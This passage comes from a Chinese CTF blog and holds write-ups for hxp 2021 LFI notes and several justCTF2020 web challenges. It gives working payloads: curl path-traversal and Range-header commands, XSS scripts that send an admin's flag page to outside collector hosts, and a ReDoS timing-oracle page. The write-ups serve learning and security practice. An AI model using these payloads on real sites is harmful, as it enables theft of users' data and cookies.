<h4 id="其他的杂七杂八"><a href="#其他的杂七杂八" class="headerlink" title="其他的杂七杂八"></a>其他的杂七杂八</h4><p>PHP怎么能读nginx的proc呢？因为PHP和nginx是同一个用户部署的，都是www-data，所以就有对应的文件权限咯</p>
<p>counter也能用这个竞争去打，但打起来需要再进一步，再多一个file_put_contents的竞争，双重竞争难度++，简单的说就是得加钱。</p>
<p>还有一些加强条件竞争成功率的辅助手段，例如使用如下代码创建一个http连接池，取消tcp三次握手的时延，更高强度的进行竞争</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create_requests_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead</span>
    adapter <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>pool_connections<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span> pool_maxsize<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> adapter<span class="token punctuation">)</span>
    <span class="token keyword">return</span> session
</code></pre>
<p>以及使用multiprocessing库和threading库，同时多开进程和线程，最大程度上往外狂发请求，使用multiprocessing库好像能在一定程度上减少python本身的GIL（全局解释器锁）虚假多线程的影响（印象里好像就是多线程其实也只有那个拿到GIL的线程能跑，每次只有一个线程在CPU上执行，顶多就是利用好IO切换的时间，能跑满一个CPU），开了这个多进程之后似乎是每个CPU上单独起一个python进程，各自有各自的GIL，反正就是能提高CPU利用率就是了，在多个CPU上各自进程的线程疯狂上下，而不是只在一个CPU上几个线程疯狂上下</p>
<p>还有之前hxpctf2019出的includer的题解，使用<code>compress.zlib://</code>这个协议产生临时文件（就和上传文件的产生临时文件类似），配合nginx错误配置的目录遍历获取临时文件名<br>这里面同时也使用了手写socket卡住PHP执行，利用PHP输出缓冲区大小限制，通过输出长度大于缓冲区强制PHP在http请求未结束时提前发送回显等操作，至于那个临时文件上传多少写入多少，先校验再继续传输写入包含，多多少少有点玄幻，可能需要高强度看源码，但都很值得学习<br><a href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer">https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer</a></p>
<p>不过说到底，PHP文件包含一般有一个裸包含，upload progress基本上就能打通了，生产环境也许还能再包含一下log之类的，感觉这种在极限限制下的奇技淫巧意义不一定大啊</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>出题人的官方题解<br><a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a><br>pasten的题解（说起来这个解就是预期解来着）<br><a href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">Winning the Impossible Race – An Unintended Solution for Includer’s Revenge &#x2F; Counter (hxp 2021)</a><br>zedd师傅的分析<br><a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>justCTF2020</title>
    <url>/justCTF2020.html</url>
    <content><![CDATA[<h1 id="justCTF2020"><a href="#justCTF2020" class="headerlink" title="justCTF2020"></a>justCTF2020</h1><p>一个都不会啊，纯挨打<br>等wping</p>
<h2 id="Forgotten-name"><a href="#Forgotten-name" class="headerlink" title="Forgotten name"></a>Forgotten name</h2><p>要猜一个6a开头的子域名，第一反应是子域名查询或者同ip查询。我找的国内的同ip域名查询网站计划不通（随便选了个web题的域名的ip查），老国王找了个子域名查询网站一键打穿<br>然后把域名十六进制解码一下得到flag。。。</p>
<h2 id="Go-fs"><a href="#Go-fs" class="headerlink" title="Go-fs"></a>Go-fs</h2><p>GO语言写的文件服务，因为源码下下来一看发现不是很长，所以就直接进行了一个Go的零基础学习。也没学到什么然后硬看代码，看了两个小时大概理清什么情况<br>首先自己写了一个文件系统，又实现了一个文件类，看Dockerfile可以看到启动时以tmp文件夹为根目录建立文件系统，文件系统维护一个结构体切片存每个文件的信息，还有一个字节切片存所有文件，每个文件都就直接append上去，然后会对应的存文件的offset和len；文件类就重写了该重写的方法，利用文件系统的信息从字节切片里面按照offset和len读出文件。也写了根目录下有文件夹的操作，但实际上好像并没什么用，并且这个创建过程用户也不可干预，等于说用户交互之前这个文件系统就已经建立完成了。<br>用HandleFunc函数建立路由，根目录的话会用fileServ.ServeHTTP(w, r)这个函数根据请求返回数据，查了下源码实现（没有看的很深，可能问题就在这？），最后是通过r.URL.Path去fileServ文件系统中的文件，用户可控交互就在这了。<br>尝试发现Path会被自动URL解码，如果输入跳目录之类的操作会尝试对路径进行解析之后进行重定向<br>flag就在tmp下，但是有另一个HandleFunc的路由就是flag，导致请求的path为flag时直接返回一个不给</p>
<h3 id="比赛结束看wp"><a href="#比赛结束看wp" class="headerlink" title="比赛结束看wp"></a>比赛结束看wp</h3><p>上面提到访问路径如果带目录的话就会被尝试解析然后重定向，这个是go语言自己的检查，所以无论如何都会重定向回&#x2F;flag，而flag这个路由被一个handler给拦住了</p>
<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>go文档里有这么一句</p>
<blockquote>
<p>The path and host are used unchanged for CONNECT requests.</p>
</blockquote>
<p>说实话我都没怎么听说过CONNECT这个请求类型（是不是之前学http隧道代理的时候见过。。。）<br>用curl指定请求类型为CONNECT之后再相对路径一把梭就通了<br><code>curl -X CONNECT --path-as-is http://gofs.web.jctf.pro/folder/../flag</code><br>–path-as-is这个选项就是不解析掉一个点或者两个点这种相对路径的意思（burp之类的也能硬发带相对路径的请求，这个应该只是让curl本身别去解析相对路径）</p>
<h4 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h4><p>说实话我觉得非预期好容易理解哦。。。<br>预期应该就和之前的文件系统操作有关？<br><code> curl -H &#39;Range: bytes=--1&#39; http://gofs.web.jctf.pro/IMG_1052.jpg</code><br>这里的Range: bytes&#x3D;–1会被解析为bytes为-1，最后会导致读取文件系统的位置发生错误，就之前那写的一大段的offset和length之类的不符合正常的情况，就隔着之前的文件读到了flag打通？</p>
<h2 id="Baby-CSP"><a href="#Baby-CSP" class="headerlink" title="Baby CSP"></a>Baby CSP</h2><p>这得来一个XSS大师。。。<br>可控点两个，一个hash算法一个用户名，指定了哈希算法就产生一个随机字符串用对应算法哈希十次作为nonce，不然就md5十次<br>用户名会直接输出到页面上，理论上可XSS，但长度限制23，且设置了CSP得nonce对<br>用啥算法nonce都得至少八位，且都是0-9a-f，不会出现特殊字符。且我也不能控制哈希的初始字符串，不知道这个CSP咋绕，应该是有神妙手段<br>怎么构造只有23个字符的XSS呢？<br>isAdmin验证过了之后还设置了几个响应头，一个<code>X-Content-Type-Options: nosniff</code>让浏览器把返回内容就按照Content-Type解析，是text&#x2F;html就不能解析JS吗？一个<code>X-Frame-Options: DENY</code>阻止套iframe之类的<br>echo flag之后直接die，也就没有后面的哈希和xss环节了，所以这个请求头又能干嘛？一开始还以为是构造出一个xss让admin访问之后外带内容的，现在看来感觉是只能硬过admin判断自己去看flag了</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">"secrets.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'X-Content-Type-Options: nosniff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'X-Frame-Options: DENY'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type: text/html; charset=UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">else</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token string">"You are not an admin!"</span><span class="token punctuation">;</span>
     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'alg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$_nonce</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'alg'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$nonce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_nonce</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token variable">$_nonce</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$nonce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-security-policy: default-src 'none'; style-src 'nonce-$nonce'; script-src 'nonce-$nonce'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOT</span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>$nonce<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>
            <span class="token function">setInterval</span><span class="token punctuation">(</span>
                <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>user<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color<span class="token operator">=</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0.3</span><span class="token operator">?</span><span class="token string">'red'</span><span class="token punctuation">:</span><span class="token string">'black'</span>
            <span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span> Hello <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>user<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token operator">!</span><span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>Click <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?flag<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>here<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span> to get a flag<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
<span class="token constant">EOT</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// Found a bug? We want to hear from you! /bugbounty.php</span>
<span class="token comment" spellcheck="true">// Check /Dockerfile</span>
</code></pre>
<h3 id="看WP"><a href="#看WP" class="headerlink" title="看WP"></a>看WP</h3><p>看dockerfile可以看到php.ini用的是development的，也就意味着报错会直接输出出来（不过不看dockerfile直接乱输也能试出来）</p>
<h4 id="warning缓冲区溢出覆盖header"><a href="#warning缓冲区溢出覆盖header" class="headerlink" title="warning缓冲区溢出覆盖header"></a>warning缓冲区溢出覆盖header</h4><p>CSP是由header函数发送的，header有一个要求，即调用该函数前不能有任何的实际输出(比如echo，或者HTML标签之类的)，否则header的函数调用会被忽略<br>但是看代码的话header之前是没有任何输出的，但是可以通过输一个不存在的算法触发warning，通过for循环是个warning塞爆缓冲区，使得其成为实际输出，就能阻止header函数的调用。<br>echo或者是HTML内容都是直接输出，所以会直接使header失效，且没有长度限制，而PHP的默认缓冲区大小为4096，所以得用总长度超出4096的warning把缓冲区塞满就会强制输出使得header无效<br>之后就是一个23长度的XSS了</p>
<h4 id="23长度XSS"><a href="#23长度XSS" class="headerlink" title="23长度XSS"></a>23长度XSS</h4><p>说实话也很极限，这里直接抄一个payload<code>&lt;svg/onload=eval(name)&gt;</code>，长度刚好是23，此处的name为window.name属性</p>
<h4 id="Window-name"><a href="#Window-name" class="headerlink" title="Window.name"></a>Window.name</h4><p>一开始看到上面这个操作感觉挺玄幻的，因为都已经location跳转了，怎么这个name还能继承过去并被eval？<br>一个tab(标签页)就是一个window，它可以打开各种网页，也可以在网页之间跳转，其打开的页面均对window.name拥有读写权限，window.name只要这个tab不关闭就能保持不变，即使是从一个页面跳转到了另一个页面，所以这里可以location跳转之后还能eval name这个之前定义的变量的内容</p>
<p>比如</p>
<pre class=" language-javascript"><code class="language-javascript">    window<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"这是a页面的内容"</span><span class="token punctuation">;</span> 
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span> b<span class="token punctuation">.</span>html<span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>写一个payload</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    name<span class="token operator">=</span>"<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'?flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">async</span> e<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`https://www.z3ratu1.cn/jctf?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">await</span> e<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>"<span class="token punctuation">;</span>
    location <span class="token operator">=</span> <span class="token string">'https://baby-csp.web.jctf.pro/?user=%3Csvg%20onload=eval(name)%3E&amp;alg='</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">'400'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre>
<p>打自己成功了，可以收到一个<code>you are not admin!</code>但是bot好像坏掉了？我只能收到提交的链接，就算payload里直接发一个请求也收不到</p>
<p>暂时就当自己打通了吧。。。。</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>过年摸鱼的下场，现在回来发现环境已经关掉了。出题人提到因为admin的cookie的samesite属性默认为lax</p>
<blockquote>
<p>Cookies允许与顶级导航一起发送，并将与第三方网站发起的GET请求一起发送。</p>
</blockquote>
<p>就是只能链接跳转之类的才会发送第三方cookie，所以想用iframe打的话得window.open新开一个tab，然后再读取tab的内容发送出来，我上面这个是直接location跳转到了babycsp这个网站，lax cookie会携带，然后再发出来<br>iframe版payload<br><code>let x = window.open(&#39;/?flag&#39;); x.onload = () =&gt; &#123;fetch(&#39;https://enavfajw8uem.x.pipedream.net/?f=&#39; + x.document.documentElement.innerHTML)&#125;</code></p>
<p>出题人多次提到bot会在网站加载结束之后立即关闭网页，不知道这个是不是之前没打通的原因，可能加载完了还没处理完脚本吗？看一个外国大哥的wp里放了一个NASA的巨型图片使得页面能长时间保持在加载状态<br><code>&lt;img src=&quot;https://eoimages.gsfc.nasa.gov/images/imagerecords/73000/73751/world.topo.bathy.200407.3x21600x21600.B1.png&quot; style=&quot;display:none&quot; /&gt;</code></p>
<h2 id="Computeration"><a href="#Computeration" class="headerlink" title="Computeration"></a>Computeration</h2><p>睡一觉起来之后放的新题，是XSS，还是DOM XSS，是我完全不会的东西，开始临时学习<br>直接script居然X不了</p>
<p>开始学习并获得一些前置知识</p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>DOM XSS就是没有服务端参与，没有什么服务端接受输入再拼到页面上，而是直接是前端js拼接location.hash，URL参数之类的东西造成的XSS，也算一种反射型XSS吧</p>
<h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>就是URL中#号后面的部分（包括井号），若不存在则为空字符串，若只有井号也为空串，location.hash不会进行URL解码<br>不过#后面的数据不会发送给服务端，也就意味着能过waf</p>
<h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>代码中添加note是通过修改innerHTML完成的，尝试直接scriptXSS失败，问了下师傅再百度一下，还真是innerHTML的原因</p>
<blockquote>
<p>HTML 5 中指定不执行由 innerHTML 插入的<code> &lt;script&gt;</code> 标签。然而，有很多不依赖 <code>&lt;script&gt;</code> 标签去执行 JavaScript 的方式。所以当你使用 innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。</p>
</blockquote>
<p>所以要这么XSS<code>element.innerHTML = &quot;&lt;img src=x onerror=\&quot;alert(&#39;XSS Attack&#39;)\&quot;&gt;&quot;; </code></p>
<h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><p>看名字就知道是本地存储，也就是存在我本地的东西。。。对应还有一个sessionStorage<br>sessionStorage 是针对session的数据存储，关闭窗口后删除。<br>localStorage 是一个本地的没有时间限制的数据存储。<br>本地存储的东西终究打不了远程</p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss</a><br>讲到了常用的可控资源和常见的可以利用的”水坑”，攻击就是将source导入到sink中，还蛮有意思的</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>最后还是znj师傅，lgw和AA牛逼，使用ReDOS把flag盲注出来了，还记得龚老师以前说过js单线程容易受到ReDOS攻击，消耗太多时间在正则匹配上导致的拒绝服务<br>只要构造出能够导致js正则反复匹配的payload，再使用正向肯定预查，在正向肯定查找内容不符合时直接得出不匹配的结论结束正则过程。如下payload自己触发能导致一个超长延时，虽然不会导致浏览器崩溃，但是如果字符对上了那个页面会卡个30s+才会去尝试下一个字符<del>一开始HTML写的是普通版的但是提交提交到了fix版本的bot上，整了一天都不对。。我真是傻逼</del>，后来改回来之后发现，字符会有缺失，并且还会是乱序，不过确实能收到对应的最后一个字符，反正每次取最大的字符就是对的了（bot在页面加载完成后就关闭页面了，不知道这个是不是发到一半就结束的原因）</p>
<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><p>有一个点，一开始直接用的for循环加直接更改iframe的src，结果是完全不成功，可能的原因是iframe还没加载完就给我变来变去的了，所以要使用onload，等他加载完了再去操作<br>开一个iframe然后反复修改iframe的src也能触发onhashchange</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>report<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://ip:10010<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    key<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz_$'</span><span class="token punctuation">;</span>
    iframe<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
     f1<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        iframe<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'https://computeration.web.jctf.pro/?'</span><span class="token operator">+</span>n<span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">;</span>
        iframe<span class="token punctuation">.</span>onload<span class="token operator">=</span>f2<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    f2<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        iframe<span class="token punctuation">.</span>src<span class="token operator">+</span><span class="token operator">=</span><span class="token string">'^(?=justCTF\\{'</span><span class="token operator">+</span>key<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">')((((.*)*)*)*)*233'</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//iframe.src+='^(?=justCTF\\{cross_origin_timing_lol\\})((.*)*)*233';</span>
        <span class="token comment" spellcheck="true">//iframe.src+='^(?=justCTF\\{no_referer_typo_ehhhhhh\\})((((.*)*)*)*)*233';</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'report'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://ip/jctf?'</span><span class="token operator">+</span>key<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
        n<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">>=</span>key<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    iframe<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'https://computeration.web.jctf.pro/?0#'</span><span class="token punctuation">;</span>
    iframe<span class="token punctuation">.</span>onload<span class="token operator">=</span>f2<span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre>
<h3 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h3><p>出题人在写Referrer-policy的时候打错了，写成了<code>no-referer</code>，事实上应该是<code>no-referrer</code>，这样子Referrer-Policy就变成了默认的<code>no-referrer-when-downgrade</code>，只有在https发送到http时不发送Referer字段<br>所以如果直接给bot一个https请求，并查看发来的Referer字段，就能直接看见flag。。。</p>
<pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span>
<span class="token header-name keyword">Content-Length:</span> 232
<span class="token header-name keyword">Content-Type:</span> text/html; charset=utf-8
<span class="token header-name keyword">Date:</span> Wed, 10 Feb 2021 04:21:49 GMT
<span class="token header-name keyword">Etag:</span> W/"e8-FVyP6J4mzbAHkD6jTxmCNIW9HoY"
<span class="token header-name keyword">Referrer-Policy:</span> no-referer
<span class="token header-name keyword">Server:</span> Caddy
<span class="token header-name keyword">X-Powered-By:</span> Express
<span class="token header-name keyword">Connection:</span> close<span class="token text/html">

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    
    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'notes'</span><span class="token punctuation">,</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span>
        title<span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">,</span>
        content<span class="token punctuation">:</span><span class="token string">'justCTF{cross_origin_timing_lol}'</span>
    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
